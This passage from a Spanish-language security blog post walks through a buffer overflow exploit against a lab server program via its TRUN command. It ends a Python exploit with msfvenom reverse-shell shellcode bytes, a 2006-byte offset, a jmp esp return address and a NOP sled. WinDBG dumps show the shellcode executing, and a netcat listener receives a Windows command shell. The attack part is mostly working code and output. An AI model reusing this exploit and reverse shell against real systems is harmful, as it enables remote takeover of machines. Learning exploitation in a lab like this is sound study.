</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x59</span><span class="z-constant z-character z-escape z-hex z-python">\xdf</span><span class="z-constant z-character z-escape z-hex z-python">\x59</span><span class="z-constant z-character z-escape z-hex z-python">\x07</span><span class="z-constant z-character z-escape z-hex z-python">\x37</span><span class="z-constant z-character z-escape z-hex z-python">\x89</span><span class="z-constant z-character z-escape z-hex z-python">\x1f</span><span class="z-constant z-character z-escape z-hex z-python">\xf1</span><span class="z-constant z-character z-escape z-hex z-python">\xf9</span><span class="z-constant z-character z-escape z-hex z-python">\x63</span><span class="z-constant z-character z-escape z-hex z-python">\xf6</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xae</span><span class="z-constant z-character z-escape z-hex z-python">\x53</span><span class="z-constant z-character z-escape z-hex z-python">\xe3</span><span class="z-constant z-character z-escape z-hex z-python">\x8f</span><span class="z-constant z-character z-escape z-hex z-python">\x9c</span><span class="z-constant z-character z-escape z-hex z-python">\x63</span><span class="z-constant z-character z-escape z-hex z-python">\x75</span><span class="z-constant z-character z-escape z-hex z-python">\x90</span><span class="z-constant z-character z-escape z-hex z-python">\xc8</span><span class="z-constant z-character z-escape z-hex z-python">\x15</span><span class="z-constant z-character z-escape z-hex z-python">\x99</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x21</span><span class="z-constant z-character z-escape z-hex z-python">\xa5</span><span class="z-constant z-character z-escape z-hex z-python">\x63</span><span class="z-constant z-character z-escape z-hex z-python">\xa6</span><span class="z-constant z-character z-escape z-hex z-python">\x8e</span><span class="z-constant z-character z-escape z-hex z-python">\x21</span><span class="z-constant z-character z-escape z-hex z-python">\x64</span><span class="z-constant z-character z-escape z-hex z-python">\xdf</span><span class="z-constant z-character z-escape z-hex z-python">\xf2</span><span class="z-constant z-character z-escape z-hex z-python">\xd1</span><span class="z-constant z-character z-escape z-hex z-python">\x8b</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x0a</span><span class="z-constant z-character z-escape z-hex z-python">\xb7</span><span class="z-constant z-character z-escape z-hex z-python">\xe2</span><span class="z-constant z-character z-escape z-hex z-python">\xc1</span><span class="z-constant z-character z-escape z-hex z-python">\x16</span><span class="z-constant z-character z-escape z-hex z-python">\x9e</span><span class="z-constant z-character z-escape z-hex z-python">\x6a</span><span class="z-constant z-character z-escape z-hex z-python">\x8c</span><span class="z-constant z-character z-escape z-hex z-python">\xc3</span><span class="z-constant z-character z-escape z-hex z-python">\xa2</span><span class="z-constant z-character z-escape z-hex z-python">\xf6</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x2f</span><span class="z-constant z-character z-escape z-hex z-python">\x3e</span><span class="z-constant z-character z-escape z-hex z-python">\xe0</span><span class="z-constant z-character z-escape z-hex z-python">\x0e</span><span class="z-constant z-character z-escape z-hex z-python">\xac</span><span class="z-constant z-character z-escape z-hex z-python">\xca</span><span class="z-constant z-character z-escape z-hex z-python">\x99</span><span class="z-constant z-character z-escape z-hex z-python">\xf4</span><span class="z-constant z-character z-escape z-hex z-python">\xac</span><span class="z-constant z-character z-escape z-hex z-python">\xbf</span><span class="z-constant z-character z-escape z-hex z-python">\x9c</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\xb1</span><span class="z-constant z-character z-escape z-hex z-python">\x6a</span><span class="z-constant z-character z-escape z-hex z-python">\x2c</span><span class="z-constant z-character z-escape z-hex z-python">\xed</span><span class="z-constant z-character z-escape z-hex z-python">\xaa</span><span class="z-constant z-character z-escape z-hex z-python">\x1e</span><span class="z-constant z-character z-escape z-hex z-python">\x52</span><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-constant z-character z-escape z-hex z-python">\xca</span><span class="z-constant z-character z-escape z-hex z-python">\x0a</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> 0x396f4338 = 2006
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x41</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">2006</span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> junk
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">p32</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-hexadecimal z-python"><span class="z-punctuation z-definition z-numeric z-base z-python">0x</span>625011bb</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> eip -&gt; jmp esp
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x90</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">10</span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">shellcode</span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x90</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">2100</span> <span class="z-keyword z-operator z-arithmetic z-python">-</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-group z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> filler
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">TRUN .<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span></code></pre>
<p>EL siguiente volcado de WinDBG muestra los nops y justo detrás el shellcode</p>
<pre class="z-code"><code><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=00fbf1e8 ebx=000000d8 ecx=00db50fc edx=0000000a esi=00401848 edi=00401848
</span><span class="z-text z-plain">eip=625011bb esp=00fbf9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">essfunc!EssentialFunc3+0x3:
</span><span class="z-text z-plain">625011bb ffe4            jmp     esp {00fbf9c8}
</span><span class="z-text z-plain">0:003&gt; dd esp
</span><span class="z-text z-plain">00fbf9c8  90909090 90909090 13ba9090 dd1095a8
</span><span class="z-text z-plain">00fbf9d8  2474d9c0 c92958f4 c08352b1 0e503104
</span><span class="z-text z-plain">00fbf9e8  77a64303 f55e9fe5 9a9f5f06 9aaeba8f
</span><span class="z-text z-plain">00fbf9f8  2a81cff4 c02d9d7e a4a535d2 020e3afa
</span><span class="z-text z-plain">00fbfa08  3f8f75dd 4213141d 8d2af672 f06bf787
</span><span class="z-text z-plain">00fbfa18  7e24a56a ca4059d8 da1ad2e1 ddea0761
</span><span class="z-text z-plain">00fbfa28  84609640 bca41942 f9a901ca 7519ba85
</span><span class="z-text z-plain">00fbfa38  76506a14 855c53bb 765b94c5 0b9fecb0
</span></code></pre>
<p>Como podemos ver en el siguiente volcado si pasamos por encima los nops, se ejecutará nuestro shellcode y se establecerá una conexión.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:002&gt; p
</span><span class="z-text z-plain">eax=00a2f1e8 ebx=00000118 ecx=00df72ec edx=0000000a esi=00401848 edi=00401848
</span><span class="z-text z-plain">eip=00a2f9c8 esp=00a2f9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">00a2f9c8 90              nop
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:002&gt; u @eip l15
</span><span class="z-text z-plain">00a2f9c8 90              nop
</span><span class="z-text z-plain">00a2f9c9 90              nop
</span><span class="z-text z-plain">00a2f9ca 90              nop
</span><span class="z-text z-plain">00a2f9cb 90              nop
</span><span class="z-text z-plain">00a2f9cc 90              nop
</span><span class="z-text z-plain">00a2f9cd 90              nop
</span><span class="z-text z-plain">00a2f9ce 90              nop
</span><span class="z-text z-plain">00a2f9cf 90              nop
</span><span class="z-text z-plain">00a2f9d0 90              nop
</span><span class="z-text z-plain">00a2f9d1 90              nop
</span><span class="z-text z-plain">00a2f9d2 ba13a89510      mov     edx,1095A813h
</span><span class="z-text z-plain">00a2f9d7 ddc0            ffree   st(0)
</span><span class="z-text z-plain">00a2f9d9 d97424f4        fnstenv [esp-0Ch]
</span><span class="z-text z-plain">00a2f9dd 58              pop     eax
</span><span class="z-text z-plain">00a2f9de 29c9            sub     ecx,ecx
</span><span class="z-text z-plain">00a2f9e0 b152            mov     cl,52h
</span><span class="z-text z-plain">00a2f9e2 83c004          add     eax,4
</span><span class="z-text z-plain">00a2f9e5 31500e          xor     dword ptr [eax+0Eh],edx
</span><span class="z-text z-plain">00a2f9e8 0343a6          add     eax,dword ptr [ebx-5Ah]
</span><span class="z-text z-plain">00a2f9eb 77e5            ja      00a2f9d2
</span><span class="z-text z-plain">00a2f9ed 9f              lahf
</span></code></pre>
<p>Nos ponemos a la escucha mediante netcat por el puerto 443 que es el que se ha definido en la shell inversa con msfvenom.</p>
<pre class="z-code"><code><span class="z-text z-plain">dreamer@debian:~$ sudo nc -lvnp 443
</span><span class="z-text z-plain">Listening on 0.0.0.0 443
</span><span class="z-text z-plain">Connection received on 192.168.1.131 49797
</span><span class="z-text z-plain">Microsoft Windows [Versi�n 10.0.19045.6456]
</span><span class="z-text z-plain">(c) Microsoft Corporation. Todos los derechos reservados.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">C:\Users\dreamer\Downloads&gt;
</span></code></pre>

      </article>

      
      

      
      
    </div>

    


<footer>
  <div class="left">
    <div class="copyright">
      © 0x7e9 Dreamer
      
    </div>
  </div>

  <div class="right">
    
    
      
    
    
    <a id="rss-btn" href="https://dreamer-r3.github.io/posts/feed.xml">RSS</a>
    
    

    
    
    
    <button id="theme-toggle" aria-label="theme switch">
      <span class="moon-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>
</span>
      <span class="sun-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>
</span>
    </button>
    
  </div>
</footer>




<dialog id="rss-mask">
  <div>
    <a href="https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts&#x2F;feed.xml">https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts&#x2F;feed.xml</a>
    
    
    <button autofocus aria-label="copy" data-link="https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts&#x2F;feed.xml" data-copy-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
" data-check-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
" >
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>

    </button>
  </div>
</dialog>



  </main>
</div>

  
<script src="/js/lightense.min.js"></script>


  <script src="https://dreamer-r3.github.io/js/main.js"></script>
</body>

</html>
